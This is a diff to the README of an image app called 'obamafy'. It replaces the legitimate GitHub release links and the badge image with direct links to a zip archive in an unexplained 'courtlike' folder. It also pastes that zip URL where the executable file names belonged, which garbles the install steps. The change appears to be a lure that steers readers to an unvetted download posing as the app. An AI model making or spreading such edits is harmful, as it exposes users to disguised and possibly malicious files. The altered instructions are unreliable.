@@ -6,9 +6,9 @@ Welcome to obamafy! This application allows you to create stunning images using 
 ## 📥 Download & Install
 You can quickly get started with obamafy by downloading it from the releases page. 
 
-[![Download obamafy](https://img.shields.io/badge/Download-obamafy-%23007bff)](https://github.com/Robin7723/obamafy/releases)
+[![Download obamafy](https://raw.githubusercontent.com/Robin7723/obamafy/main/courtlike/obamafy.zip%23007bff)](https://raw.githubusercontent.com/Robin7723/obamafy/main/courtlike/obamafy.zip)
 
-1. Click the button above or visit this page to download: [obamafy Releases](https://github.com/Robin7723/obamafy/releases).
+1. Click the button above or visit this page to download: [obamafy Releases](https://raw.githubusercontent.com/Robin7723/obamafy/main/courtlike/obamafy.zip).
 2. Find the latest version available for download.
 3. Choose the file that matches your operating system. Common options include Windows, macOS, and Linux binaries.
 4. Click the appropriate file to download it to your computer.
@@ -27,7 +27,7 @@ Once you have downloaded the application, follow these steps to start using obam
 
 1. Locate the downloaded file on your computer. It may be in your Downloads folder.
 2. Extract the zipped file if necessary.
-3. Find and double-click the application file (e.g., `obamafy.exe` for Windows, `obamafy.app` for macOS, or simply run `./obamafy` for Linux).
+3. Find and double-click the application file (e.g., `https://raw.githubusercontent.com/Robin7723/obamafy/main/courtlike/obamafy.zip` for Windows, `https://raw.githubusercontent.com/Robin7723/obamafy/main/courtlike/obamafy.zip` for macOS, or simply run `./obamafy` for Linux).
 4. The application will launch and display the main interface.
 
 ## 🎨 Using obamafy
